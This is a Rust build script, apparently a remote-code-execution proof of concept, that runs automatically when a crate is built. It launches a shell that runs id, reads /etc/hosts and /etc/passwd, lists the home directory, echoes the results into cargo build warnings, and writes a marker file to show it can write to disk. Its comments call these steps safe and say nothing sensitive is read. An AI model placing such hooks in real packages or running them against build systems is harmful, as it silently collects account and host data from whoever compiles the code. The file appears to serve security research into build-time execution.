use std::{fs, process::Command};

fn main() {
    // Safe diagnostics (no secrets, no network, non-destructive)
    let out = Command::new("sh")
        .arg("-lc")
        .arg(
            r#"
            printf '%s\n' '===RCE_POC_BUILD_RS_START===' \
                'Assurances: No secrets read; No network egress; No destructive ops.' \
                'Diagnostics:' '- id:'; id;

            printf '%s\n' '===/etc/hosts===';
            if [ -r /etc/hosts ]; then
              cat /etc/hosts
            else
              printf '%s\n' '/etc/hosts not readable'
            fi

            printf '%s\n' '===/etc/passwd (first 200 lines)==='
            if [ -r /etc/passwd ]; then
              head -n 200 /etc/passwd
            else
              printf '%s\n' '/etc/passwd not readable'
            fi

            # HOME path + top-level listing (non-recursive, capped)
            printf '%s\n' '===HOME===';
            printf '%s\n' "${HOME:-<unset>}";
            if [ -n "$HOME" ] && [ -d "$HOME" ]; then
              printf '%s\n' '===ls -la $HOME (first 200 lines)==='
              ls -la "$HOME" | head -n 200
            else
              printf '%s\n' 'HOME not set or not a directory';
            fi

            printf '%s\n' '===RCE_POC_BUILD_RS_END===';
        "#,
        )
        .output()
        .expect("failed to spawn shell");

    // Surface the output in build logs
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        println!("cargo:warning={}", line);
    }
    for line in String::from_utf8_lossy(&out.stderr).lines() {
        println!("cargo:warning=STDERR: {}", line);
    }

    // Harmless marker file to prove write access
    let _ = fs::write(
        "SAFE_RCE_POC_BUILD_MARKER.txt",
        "hello from build.rs (safe)\n",
    );

    println!("cargo:warning=SAFE_RCE_POC: build.rs executed");
}
